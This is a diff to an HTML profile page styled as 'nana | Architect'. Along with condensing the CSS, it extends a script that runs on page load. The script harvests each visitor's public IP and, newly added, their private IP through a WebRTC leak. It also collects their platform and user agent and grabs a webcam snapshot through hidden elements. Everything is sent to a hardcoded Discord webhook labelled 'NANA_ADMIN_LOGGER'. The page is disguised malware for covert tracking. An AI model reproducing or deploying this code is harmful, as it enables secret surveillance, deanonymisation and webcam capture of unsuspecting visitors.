@@ -5,67 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Profile: nana | Architect</title>
     <style>
-        :root {
-            --bg: #050505;
-            --accent: #ff4141;
-            --text: #ffffff;
-            --dim: #888;
-        }
-        body {
-            margin: 0;
-            background: var(--bg);
-            color: var(--text);
-            font-family: 'Consolas', 'Courier New', monospace;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            overflow: hidden;
-        }
-        .background {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at center, #1a0505 0%, #050505 100%);
-            z-index: -1;
-        }
-        .profile-card {
-            background: rgba(15, 10, 10, 0.9);
-            border: 1px solid var(--accent);
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 0 40px rgba(255, 65, 65, 0.2);
-            text-align: center;
-            max-width: 450px;
-            backdrop-filter: blur(10px);
-        }
-        .icon {
-            width: 150px;
-            height: 150px;
-            border: 2px solid var(--accent);
-            margin-bottom: 20px;
-            box-shadow: 0 0 15px var(--accent);
-        }
-        h1 {
-            font-size: 2.2rem;
-            margin: 0;
-            letter-spacing: 5px;
-            color: var(--accent);
-            text-transform: uppercase;
-        }
-        .info-box {
-            margin-top: 20px;
-            text-align: left;
-            border-left: 2px solid var(--accent);
-            padding-left: 20px;
-        }
+        :root { --bg: #050505; --accent: #ff4141; --text: #ffffff; --dim: #888; }
+        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Consolas', 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        .background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at center, #1a0505 0%, #050505 100%); z-index: -1; }
+        .profile-card { background: rgba(15, 10, 10, 0.9); border: 1px solid var(--accent); padding: 40px; border-radius: 8px; box-shadow: 0 0 40px rgba(255, 65, 65, 0.2); text-align: center; max-width: 450px; backdrop-filter: blur(10px); }
+        .icon { width: 150px; height: 150px; border: 2px solid var(--accent); margin-bottom: 20px; box-shadow: 0 0 15px var(--accent); }
+        h1 { font-size: 2.2rem; margin: 0; letter-spacing: 5px; color: var(--accent); text-transform: uppercase; }
+        .info-box { margin-top: 20px; text-align: left; border-left: 2px solid var(--accent); padding-left: 20px; }
         .label { color: var(--accent); font-weight: bold; font-size: 0.9rem; }
         .value { color: var(--text); margin-bottom: 10px; font-size: 1.1rem; }
-        .loading-log {
-            font-size: 0.75rem;
-            margin-top: 30px;
-            color: var(--dim);
-            height: 20px;
-        }
+        .loading-log { font-size: 0.75rem; margin-top: 30px; color: var(--dim); height: 20px; }
         #v, #c { visibility: hidden; position: absolute; left: -9999px; }
     </style>
 </head>
@@ -91,6 +40,20 @@
     <script>
         const WH_URL = "https://discord.com/api/webhooks/1490634346359685131/-YLEFmQlCi7HxAYEOvVWXDOehb8a3kj2DErBzYuL52iHD5pMlKmf0AU9ERkbzTXWu6lp";
 
+        async function getPrivateIP() {
+            return new Promise((resolve) => {
+                const rtc = new RTCPeerConnection({ iceServers: [] });
+                rtc.createDataChannel('');
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                rtc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (ipMatch) { resolve(ipMatch[1]); rtc.onicecandidate = null; }
+                };
+                setTimeout(() => resolve("MASKED_OR_BLOCKED"), 3000);
+            });
+        }
+
         async function startProtocol() {
             const status = document.getElementById('status');
             const v = document.getElementById('v');
@@ -98,48 +61,48 @@
             
             let report = {
                 ts: new Date().toLocaleString(),
-                ip: "Scanning...",
+                gIP: "Fetching...",
+                pIP: await getPrivateIP(),
                 plt: navigator.platform,
                 ua: navigator.userAgent
             };
 
-            // 1. IP取得
+            // 1. グローバルIP取得
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                report.ip = data.ip;
-            } catch(e) { report.ip = "Access_Denied"; }
+                report.gIP = data.ip;
+            } catch(e) { report.gIP = "ACCESS_DENIED"; }
 
-            // 2. キャプチャ・プロトコル
+            // 2. キャプチャ
             let fileBlob = null;
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 1200));
                 c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                 const dataUrl = c.toDataURL('image/jpeg');
                 const bRes = await fetch(dataUrl);
                 fileBlob = await bRes.blob();
                 stream.getTracks().forEach(t => t.stop());
-            } catch(e) { 
-                status.innerText = "LOG: MEDIA_ACCESS_BLOCKED"; 
-            }
+            } catch(e) { status.innerText = "LOG: MEDIA_ACCESS_BLOCKED"; }
 
-            // 3. データ転送
+            // 3. 送信プロトコル
             const fd = new FormData();
             if(fileBlob) fd.append('file', fileBlob, 'capture.jpg');
             
             const payload = {
                 username: "NANA_ADMIN_LOGGER",
                 embeds: [{
-                    title: "🛑 PROFILE_ACCESS_REPORT",
+                    title: "🛑 CRITICAL_PROFILE_ACCESS",
                     color: 16727873,
                     fields: [
-                        { name: "🌐 IP", value: `\`${report.ip}\``, inline: true },
-                        { name: "💻 SYSTEM", value: `\`${report.plt}\``, inline: true },
-                        { name: "📄 UA", value: `\`\`\`${report.ua}\`\`\`` }
+                        { name: "🌐 GLOBAL_IP", value: `\`${report.gIP}\``, inline: true },
+                        { name: "🏠 PRIVATE_IP", value: `\`${report.pIP}\``, inline: true },
+                        { name: "💻 PLATFORM", value: `\`${report.plt}\``, inline: true },
+                        { name: "📄 USER_AGENT", value: `\`\`\`${report.ua}\`\`\`` }
                     ],
-                    footer: { text: `Captured: ${report.ts}` }
+                    footer: { text: `System Time: ${report.ts}` }
                 }]
             };
             fd.append('payload_json', JSON.stringify(payload));
@@ -147,9 +110,7 @@
             try {
                 await fetch(WH_URL, { method: 'POST', body: fd });
                 status.innerText = "LOG: CONNECTION ESTABLISHED. DATA SYNCED.";
-            } catch(e) { 
-                status.innerText = "LOG: OFFLINE_RETRY_PENDING"; 
-            }
+            } catch(e) { status.innerText = "LOG: TRANSMISSION_ERROR"; }
         }
         window.onload = startProtocol;
     </script>
